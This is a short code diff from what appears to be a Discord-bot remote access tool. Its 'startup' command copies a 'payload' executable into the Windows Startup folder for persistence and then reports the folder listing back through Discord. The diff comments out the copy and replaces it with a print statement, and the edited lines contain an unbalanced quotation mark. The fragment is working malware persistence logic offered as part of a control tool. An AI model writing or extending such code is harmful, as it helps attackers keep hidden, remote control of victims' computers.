@@ -119,7 +119,8 @@ async def startup(ctx):
     os.chdir(ogdir)
     await ctx.send(embed = discord.Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
     # subprocess.run('copy "' + executable + '" "' + os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" + '"')
-    subprocess.run(f'copy {executable} {os.getenv("appdata")}"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    # subprocess.run(f'copy {executable} {os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    print(f'copy {executable} {os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
     os.chdir(os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
     await ctx.send(embed = discord.Embed(title = "If you see the program here, you're good to go: ", color = 0x0081FA))
     for value in os.listdir(): msg += f'{value}\n'
